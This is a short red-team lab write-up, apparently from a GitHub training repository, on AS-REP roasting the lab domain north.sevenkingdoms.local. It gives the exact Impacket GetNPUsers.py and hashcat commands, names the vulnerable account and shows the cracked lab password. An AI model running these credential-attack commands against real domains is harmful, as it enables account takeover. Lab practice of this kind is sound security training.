🔐 Case 002: Credential Access (AS-REP Roasting & Kerberoasting)
⚔️ Red Team: Attack Simulation
1. AS-REP Roasting (Impacket)
Using the username list harvested in Case 001, an AS-REP Roast was performed to identify accounts vulnerable to credential harvesting without authentication.

Command: GetNPUsers.py north.sevenkingdoms.local/ -no-pass -usersfile users.txt

Target: brandon.stark@NORTH.SEVENKINGDOMS.LOCAL

Finding: The account was identified as having UF_DONT_REQUIRE_PREAUTH set, allowing for the extraction of a crackable Kerberos hash.

2. Offline Password Cracking (Hashcat)
The harvested hash was subjected to an offline dictionary attack to recover the plaintext password.

Command: hashcat -m 18200 asrep.hash /opt/wordlist/rockyou.txt

Result: CRACKED

Recovered Password: iseedeadpeople

📸 Evidence: Successful Credential Recovery
<img width="1919" height="596" alt="image" src="https://github.com/user-attachments/assets/ee42923a-fed5-4235-a588-75ae456fd5d3" />
